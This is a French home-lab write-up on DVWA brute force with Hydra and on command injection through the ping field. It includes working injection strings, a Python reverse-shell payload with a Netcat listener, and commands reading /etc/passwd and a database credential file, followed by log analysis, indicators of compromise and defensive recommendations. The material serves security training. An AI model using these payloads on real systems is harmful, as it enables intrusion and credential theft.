# DVWA : Brute Force & Command Injection

**29 mai 2026**

**Plateforme :** DVWA (Damn Vulnerable Web Application) — Home Lab  
**Niveau :** Low  
**Outils utilisés :** Hydra, Netcat, Python3, curl, cat, grep


## 1. Contexte

DVWA (Damn Vulnerable Web Application) est une application web intentionnellement vulnérable, déployée localement sur Kali Linux dans le cadre d'un home lab de formation en cybersécurité. Elle simule les vulnérabilités web les plus courantes dans un environnement contrôlé et légal.

Ce write-up couvre deux vecteurs d'attaque distincts testés sur DVWA niveau **Low** (aucune protection active) :

- **Brute Force** : attaque automatisée sur un formulaire d'authentification
- **Command Injection** : injection de commandes système via un champ non sanitisé, aboutissant à un reverse shell

Ces deux vulnérabilités figurent dans l'**OWASP Top 10** et sont régulièrement rencontrées en environnement de production mal configuré.

**Objectif de l'exercice :** comprendre la chaîne d'exploitation complète, identifier les traces laissées dans les logs Apache, et proposer des défenses concrètes.


## 2. Environnement technique

| Élément | Détail |
|---|---|
| Machine | Kali Linux (VirtualBox, réseau Host-Only) |
| Application | DVWA — stack Apache 2.4.67 + PHP 8.4.21 + MariaDB 11.8.6 |
| URL locale | http://127.0.0.1/dvwa/ |
| Niveau sécurité | Low (aucune sanitisation des entrées) |
| Rôle simulé | Attaquant externe ayant accès à l'interface web |


## 3. Méthodologie

### 3.1 Brute Force sur le formulaire d'authentification

#### Reconnaissance du formulaire

Avant de lancer une attaque automatisée, j'ai analysé le comportement du formulaire manuellement.

**Identification de la méthode HTTP :**  
En soumettant le formulaire avec des credentials incorrects, j'ai observé l'URL résultante :
```
http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login
```
→ Les credentials apparaissent **en clair dans l'URL** : le formulaire utilise la méthode **GET** (au lieu de POST). C'est une erreur de conception critique — les paramètres GET sont visibles dans les logs serveur, l'historique du navigateur et les proxies intermédiaires.

**Identification du message d'échec :**  
Pour qu'Hydra sache si une tentative a échoué, il faut lui indiquer une chaîne de texte présente uniquement en cas d'échec. J'ai utilisé `curl` pour isoler ce message :

```bash
curl -s "http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=faux&Login=Login" \
  -b "PHPSESSID=73f31c96843d99bee7aa2fa508569c9f;security=low" \
  | grep -i "incorrect"
```

**Décryptage de la commande :**
- `curl -s` : effectue une requête HTTP silencieuse (sans afficher la progression)
- L'URL contient les paramètres GET avec un mot de passe délibérément faux
- `-b "PHPSESSID=...;security=low"` : envoie les cookies de session nécessaires (sans eux, DVWA redirige vers la page de login)
- `| grep -i "incorrect"` : filtre la réponse HTML pour n'afficher que la ligne contenant "incorrect"

**Résultat obtenu :**
```
<pre><br />Username and/or password incorrect.</pre>
```
→ La chaîne d'échec à transmettre à Hydra est : `password incorrect.`

#### Lancement de l'attaque Hydra

```bash
FORM="/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=73f31c96843d99bee7aa2fa508569c9f;security=low:F=password incorrect."
hydra 127.0.0.1 http-get-form "$FORM" -l admin -P /usr/share/wordlists/rockyou.txt -V
```

**Décryptage de la commande :**
- `hydra 127.0.0.1` : cible locale
- `http-get-form` : module Hydra pour les formulaires GET
- `username=^USER^&password=^PASS^` : `^USER^` et `^PASS^` sont les marqueurs remplacés par chaque combinaison testée
- `H=Cookie\: ...` : injecte le header Cookie dans chaque requête
- `F=password incorrect.` : condition d'**échec** — si cette chaîne apparaît dans la réponse, la tentative a échoué
- `-l admin` : username fixe
- `-P rockyou.txt` : wordlist de 14 millions de mots de passe réels (fuite RockYou 2009)
- `-V` : mode verbose — affiche chaque tentative en temps réel

**Résultat :**

Le mot de passe "password" a été trouvé dès la 5ème tentative d'Hydra, ce qui démontre bien la très faible robustesse d'un mot de passe aussi courant, comportant très peu de caractères, aucune majuscule ni caractère spécial.


### 3.2 Command Injection — du champ ping au reverse shell

#### Confirmation de la vulnérabilité

Le module "Ping a device" de DVWA exécute la commande système `ping` avec l'IP saisie par l'utilisateur, sans aucune validation. J'ai confirmé la vulnérabilité avec une injection simple :

```
127.0.0.1 && whoami
```

**Résultat :** `www-data` s'affiche sous le résultat du ping, ce qui signifie que la commande système a été exécutée côté serveur.

**Pourquoi `&&` fonctionne :**  
En Linux, `&&` enchaîne deux commandes : la seconde s'exécute **uniquement si la première réussit**. Ici, `ping 127.0.0.1` réussit toujours → `whoami` s'exécute systématiquement.

#### Exploration du système

Depuis le champ d'injection, j'ai progressivement élargi la reconnaissance :

```
127.0.0.1 && cat /etc/passwd
```
→ Affiche la liste de tous les comptes système. Les comptes avec `/bin/bash` peuvent ouvrir un shell interactif.

```
127.0.0.1 && ls -la /home/
```
→ Retourne `drwx------ dimitri` : le répertoire personnel de l'utilisateur `dimitri` est inaccessible à `www-data` (permissions restrictives — principe du moindre privilège en action).

#### Obtention du reverse shell

**Principe du reverse shell :**  
Sur un shell classique, c'est l'attaquant qui se connecte à la victime. Pour un **reverse shell**, c'est la victime qui se connecte à l'attaquant. Cette inversion contourne les pare-feux qui bloquent les connexions entrantes mais autorisent les connexions sortantes.

**Étape 1 — Ouverture du listener :**
```bash
nc -lvnp 4444
```
- `nc` : Netcat — outil réseau qui ouvre un canal TCP brut
- `-l` : mode écoute (listen)
- `-v` : verbose
- `-n` : pas de résolution DNS
- `-p 4444` : port d'écoute

**Étape 2 — Injection du payload :**  
La redirection Bash `/dev/tcp` étant bloquée par la configuration PHP, j'ai utilisé un payload Python3 généré via [RevShells.com](https://www.revshells.com) — outil standard utilisé en pentest :

```
127.0.0.1 && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Ce que fait ce payload :** ouvre un socket TCP vers le listener, puis branche les entrées/sorties standard de Bash sur cette connexion — donnant un shell interactif à l'attaquant.

**Résultat :**
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44512
www-data@DimitriKali:/var/www/html/dvwa/vulnerabilities/exec$
```
→ Un shell interactif a été obtenu en tant que `www-data`.

#### Exploitation du shell — extraction des credentials BDD

```bash
cat /var/www/html/dvwa/config/config.inc.php
```

**Résultat :** les credentials de la base de données sont exposés en clair :

| Paramètre | Valeur |
|---|---|
| db_server | 127.0.0.1 |
| db_database | dvwa |
| db_user | dvwa |
| db_password | dvwa123 |

Avec ces credentials, un attaquant peut maintenant accéder à la base de données avec toutes les permissions. Il aurait accès à toutes les informations présentes dessus (credentials, données personnelles clients, données de facturation, etc.), ce qui pourrait mener à une fuite de données massive impactant à la fois les clients et la réputation de l'entreprise. Une fuite de données de ce type implique de devoir notifier la CNIL dans les 72h (article 33 RGPD), et des sanctions financières peuvent être retenues contre l'entreprise (jusqu'à 4% du chiffre d'affaires pour un montant maximal de 20 millions d'euros).

L'attaquant pourrait aussi corrompre la base de données, stoppant de force toutes les activités de l'entreprise qui nécessitent l'utilisation de ces informations.


## 4. Résultats

| Vecteur | Résultat obtenu |
|---|---|
| Brute Force | Mot de passe admin trouvé en < 30 secondes |
| Command Injection | Exécution de commandes système en tant que www-data |
| Reverse Shell | Shell interactif obtenu |
| Lecture fichier config | Credentials BDD exposés en clair |

**Chaîne d'exploitation complète :**
```
Formulaire non sanitisé
    → Command Injection (whoami, cat /etc/passwd)
        → Reverse Shell (www-data)
            → Lecture config.inc.php
                → Credentials BDD en clair
                    → Accès total aux données
```


## 5. Analyse

### 5.1 Analyse des logs Apache — perspective SOC

Après l'attaque, j'ai analysé les logs Apache pour identifier les traces laissées :

```bash
sudo cat /var/log/apache2/access.log.1 | grep "username=" | tail -20
```

**Décryptage :**
- `sudo` : les logs Apache sont lisibles uniquement par root
- `access.log.1` : fichier de log rotaté (le fichier courant ne contenait pas les entrées de la session précédente)
- `grep "username="` : filtre les requêtes contenant des tentatives d'authentification
- `tail -20` : affiche les 20 dernières lignes

**Trois signatures d'attaque identifiées :**

**Signature 1 — Volumétrie temporelle anormale**

L'ensemble des requêtes ont été faites entre 21:22:21 et 21:22:22. Un tel volume de requêtes effectué sur un laps de temps aussi court n'est pas réalisable par un humain, il s'agit d'une preuve qu'un logiciel tiers (ici Hydra) est impliqué. L'attaquant a automatisé ses actions.

**Signature 2 — Credentials en clair dans l'URL**

Le fait que les identifiants de session apparaissent en clair dans l'URL est un gros problème de confidentialité : n'importe qui ayant accès aux logs (attaquant, administrateur système, analyste ou encore outil de monitoring) pourra voir ces informations. De plus, les credentials seront également stockés en clair dans l'historique du navigateur ou les logs proxy, créant des brèches de confidentialité supplémentaires.

**Signature 3 — User-Agent "Hydra"**

Les requêtes Hydra contiennent `"Mozilla/5.0 (Hydra)"` dans le champ User-Agent. Un SOC peut créer une règle d'alerte sur ce pattern.

**Limite :** ce n'est pas une défense fiable car Hydra permet de modifier le User-Agent avec l'option appropriée pour imiter Firefox ou Chrome.

### 5.2 Pourquoi ces vulnérabilités existent en production

Ces vulnérabilités peuvent sembler évidentes a posteriori, mais elles figurent dans l'OWASP Top 10 précisément parce qu'elles restent courantes en production. Les développeurs font face à des contraintes réelles : délais serrés, projets multiples en parallèle, complexité technique prioritaire sur la sécurité, et sensibilisation insuffisante aux bonnes pratiques. C'est la combinaison de ces facteurs qui explique la persistance de ces failles dans des environnements réels.


## 6. Indicateurs de Compromission (IoC)

| Type | Valeur | Signification |
|---|---|---|
| IP source | 127.0.0.1 | Attaque locale (en production : IP externe) |
| User-Agent | Mozilla/5.0 (Hydra) | Outil de brute force Hydra |
| Pattern URL | `username=X&password=Y` répété N fois/seconde | Brute force automatisé |
| Processus | `www-data` exécutant `bash -i` | Reverse shell actif |
| Fichier accédé | `/var/www/html/dvwa/config/config.inc.php` | Lecture credentials BDD |


## 7. Recommandations

### R1 — Remplacer GET par POST sur les formulaires d'authentification
**Priorité : Critique**  
Les credentials ne doivent jamais apparaître dans l'URL. La méthode POST place les données dans le corps de la requête HTTP et par conséquent elles n'apparaissent pas dans les logs serveur par défaut ni dans l'historique du navigateur.

### R2 — Implémenter le rate limiting
**Priorité : Critique**  
Bloquer une IP après 5 échecs d'authentification en 30 secondes par exemple. Il s'agit d'un moyen d'empêcher les tentatives de brute force automatisées.

### R3 — Sanitisation des entrées utilisateur
**Priorité : Critique**  
Toute entrée utilisateur doit être validée et nettoyée avant d'être utilisée dans une commande système ou une requête SQL.

### R4 — Account lockout
**Priorité : Haute**  
Verrouiller temporairement un compte après N tentatives échouées.  
**Attention :** mal configuré, ce mécanisme peut être détourné pour du déni de service (bloquer tous les comptes légitimes). Le verrouillage doit être temporaire (ex : 15 minutes) et non permanent.


## 8. Conclusion

Cet exercice m'a permis de comprendre comment pouvait réellement se dérouler une attaque de manière concrète, et à quelle vitesse un attaquant pouvait avoir accès à des informations critiques lorsqu'un site était réellement mal configuré. Avec seulement quelques connaissances et le bon outil, les dommages peuvent être considérables. Le plus frappant a été l'injection de commande : la rapidité à obtenir un reverse shell fut impressionnante, surtout quand on se rend compte qu'une fois obtenu c'est trop tard pour la victime. Ensuite tout s'enchaîne, surtout sur une session administrateur.

---

*Write-up rédigé dans le cadre d'un home lab légal sur DVWA. Toutes les manipulations ont été effectuées sur un environnement isolé, sans impact sur des systèmes tiers.*
